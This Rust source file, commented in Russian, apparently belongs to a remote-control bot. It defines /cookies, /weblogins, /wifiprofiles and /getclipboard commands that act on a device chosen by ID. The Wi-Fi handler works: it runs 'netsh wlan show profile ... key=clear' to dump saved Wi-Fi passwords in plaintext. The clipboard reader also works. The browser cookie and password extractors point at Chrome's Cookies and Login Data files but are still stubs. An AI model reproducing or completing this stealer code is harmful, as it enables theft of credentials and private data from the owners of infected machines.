use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;

use crate::device_manager::DeviceManager;

/// Выполняет команду /cookies - извлекает cookies из браузеров
pub async fn handle_cookies_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let mut result = String::from("🍪 Cookies из браузеров:\n\n");
        
        // Chrome cookies
        if let Ok(chrome_cookies) = extract_chrome_cookies().await {
            result.push_str(&format!("🔵 Chrome: {} cookies найдено\n", chrome_cookies.len()));
        }
        
        // Firefox cookies
        if let Ok(firefox_cookies) = extract_firefox_cookies().await {
            result.push_str(&format!("🟠 Firefox: {} cookies найдено\n", firefox_cookies.len()));
        }
        
        // Edge cookies
        if let Ok(edge_cookies) = extract_edge_cookies().await {
            result.push_str(&format!("🔷 Edge: {} cookies найдено\n", edge_cookies.len()));
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Извлечение cookies пока поддерживается только на Windows"))
    }
}

/// Выполняет команду /weblogins - извлекает сохраненные логины из браузеров
pub async fn handle_weblogins_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let mut result = String::from("🔐 Сохраненные логины:\n\n");
        
        // Chrome passwords
        if let Ok(chrome_logins) = extract_chrome_passwords().await {
            result.push_str(&format!("🔵 Chrome: {} паролей найдено\n", chrome_logins.len()));
            for login in chrome_logins.iter().take(5) { // Показываем первые 5
                result.push_str(&format!("  • {} - {}\n", login.url, login.username));
            }
        }
        
        // Firefox passwords
        if let Ok(firefox_logins) = extract_firefox_passwords().await {
            result.push_str(&format!("\n🟠 Firefox: {} паролей найдено\n", firefox_logins.len()));
            for login in firefox_logins.iter().take(5) {
                result.push_str(&format!("  • {} - {}\n", login.url, login.username));
            }
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Извлечение паролей пока поддерживается только на Windows"))
    }
}

/// Выполняет команду /wifiprofiles - показывает сохраненные WiFi профили
pub async fn handle_wifiprofiles_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        // Получаем список WiFi профилей
        let output = AsyncCommand::new("netsh")
            .args(&["wlan", "show", "profiles"])
            .output()
            .await
            .context("Не удалось выполнить команду netsh")?;
            
        let profiles_output = String::from_utf8_lossy(&output.stdout);
        let mut result = String::from("📶 WiFi профили:\n\n");
        
        let mut profile_count = 0;
        
        for line in profiles_output.lines() {
            if line.contains("All User Profile") {
                if let Some(profile_name) = line.split(':').nth(1) {
                    let profile_name = profile_name.trim();
                    profile_count += 1;
                    
                    // Получаем пароль для профиля
                    if let Ok(password) = get_wifi_password(profile_name).await {
                        result.push_str(&format!("🔹 {}: {}\n", profile_name, password));
                    } else {
                        result.push_str(&format!("🔹 {}: [пароль не найден]\n", profile_name));
                    }
                }
            }
        }
        
        if profile_count == 0 {
            result.push_str("Профили WiFi не найдены");
        }
        
        Ok(result)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("WiFi профили пока поддерживаются только на Windows"))
    }
}

/// Выполняет команду /getclipboard - получает содержимое буфера обмена
pub async fn handle_getclipboard_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use clipboard_win::{Clipboard, formats};
        
        let _clip = Clipboard::new().map_err(|e| anyhow::anyhow!("Не удалось открыть буфер обмена: {:?}", e))?;
        
        // Пробуем получить текст
        if let Ok(text) = clipboard_win::get_clipboard::<String, _>(formats::Unicode) {
            if text.is_empty() {
                return Ok("📋 Буфер обмена пуст".to_string());
            }
            
            let preview = if text.len() > 200 {
                format!("{}...", &text[..200])
            } else {
                text.clone()
            };
            
            Ok(format!("📋 Содержимое буфера обмена ({} символов):\n\n{}", text.len(), preview))
        } else {
            Ok("📋 Буфер обмена не содержит текста".to_string())
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Буфер обмена пока поддерживается только на Windows"))
    }
}

// Вспомогательные структуры
#[derive(Debug)]
struct BrowserLogin {
    url: String,
    username: String,
    password: String,
}

#[derive(Debug)]
struct BrowserCookie {
    name: String,
    value: String,
    domain: String,
}

// Вспомогательные функции
async fn extract_chrome_cookies() -> Result<Vec<BrowserCookie>> {
    let user_dir = std::env::var("USERPROFILE").unwrap_or_default();
    let chrome_cookies_path = format!("{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", user_dir);
    
    if !std::path::Path::new(&chrome_cookies_path).exists() {
        return Ok(Vec::new());
    }
    
    // Здесь будет реализация чтения SQLite базы Chrome
    // Пока возвращаем заглушку
    Ok(vec![BrowserCookie {
        name: "example".to_string(),
        value: "cookie_value".to_string(),
        domain: "example.com".to_string(),
    }])
}

async fn extract_firefox_cookies() -> Result<Vec<BrowserCookie>> {
    // Аналогично для Firefox
    Ok(Vec::new())
}

async fn extract_edge_cookies() -> Result<Vec<BrowserCookie>> {
    // Аналогично для Edge
    Ok(Vec::new())
}

async fn extract_chrome_passwords() -> Result<Vec<BrowserLogin>> {
    let user_dir = std::env::var("USERPROFILE").unwrap_or_default();
    let chrome_logins_path = format!("{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", user_dir);
    
    if !std::path::Path::new(&chrome_logins_path).exists() {
        return Ok(Vec::new());
    }
    
    // Здесь будет реализация чтения зашифрованных паролей Chrome
    // Пока возвращаем заглушку
    Ok(vec![BrowserLogin {
        url: "https://example.com".to_string(),
        username: "user@example.com".to_string(),
        password: "[encrypted]".to_string(),
    }])
}

async fn extract_firefox_passwords() -> Result<Vec<BrowserLogin>> {
    // Аналогично для Firefox
    Ok(Vec::new())
}

async fn get_wifi_password(profile_name: &str) -> Result<String> {
    let output = AsyncCommand::new("netsh")
        .args(&["wlan", "show", "profile", profile_name, "key=clear"])
        .output()
        .await
        .context("Не удалось получить пароль WiFi")?;
        
    let password_output = String::from_utf8_lossy(&output.stdout);
    
    for line in password_output.lines() {
        if line.contains("Key Content") {
            if let Some(password) = line.split(':').nth(1) {
                return Ok(password.trim().to_string());
            }
        }
    }
    
    Ok("[пароль не найден]".to_string())
}